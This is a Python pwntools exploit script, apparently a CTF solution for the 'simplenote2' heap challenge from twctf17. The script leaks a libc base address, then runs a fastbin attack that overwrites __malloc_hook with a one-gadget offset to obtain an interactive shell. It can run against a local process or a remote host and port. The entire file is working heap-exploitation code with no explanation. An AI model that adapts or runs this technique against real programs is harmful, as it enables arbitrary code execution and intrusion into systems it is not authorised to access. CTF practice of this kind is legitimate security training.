#!/usr/bin/env python

from pwn import *
import sys

def add(size,content):
    r.sendlineafter("choice:", "1")
    r.sendlineafter("note.", str(size))
    r.sendafter("note.", content)

def show(idx):
    r.sendlineafter("choice:", "2")
    r.sendlineafter("note.", str(idx))
    return r.recvuntil("Your")

def delete(idx):
    r.sendlineafter("choice:", "3")
    r.sendlineafter("note.", str(idx))

def exploit(r):
    libc = ELF("./libc.so.6")
    add(255,"A") # 0
    add(255,"B") # 1
    delete(0)
    add(255,"C") # 0
    libc_base = u64(show(0).split("t:")[1][:6].ljust(8,'\0'))-0x3c4b43
    malloc_hook = libc_base+libc.symbols["__malloc_hook"]
    one_shot = libc_base+0xf0274
    log.success("libc base at: "+hex(libc_base))
   
    ## fastbin attack
    add(0x68,"C") # 2
    add(0x68,"D") # 3
    
    # C->NULL    
    delete(2)
    #delete(2)
    #pause()
    delete(0)
    #pause()
    add(0,"A"*0x210+p64(0)+p64(0x71)+p64(malloc_hook-0x30+0xd))
    #pause()
    #delete(3)

    payload = p64(malloc_hook-0x30+0xd)
    #add(0x68, payload)
    #add(0x68, "F")
    add(0x68, "G")
    add(0x68, "H"*0x13+p64(one_shot))
    
    r.sendline("3")
    r.sendline("1")
    #delete(0)
    #r.sendline(

    r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        #r = process(['/home/vagrant/CTFs/twctf17/simplenote2/simplenote2'], env={"LD_PRELOAD":""})
        r = process(['/home/vagrant/CTFs/twctf17/simplenote2/simplenote2'], env={"LD_PRELOAD":"./libc.so.6"})
        print util.proc.pidof(r)
        pause()
        exploit(r)
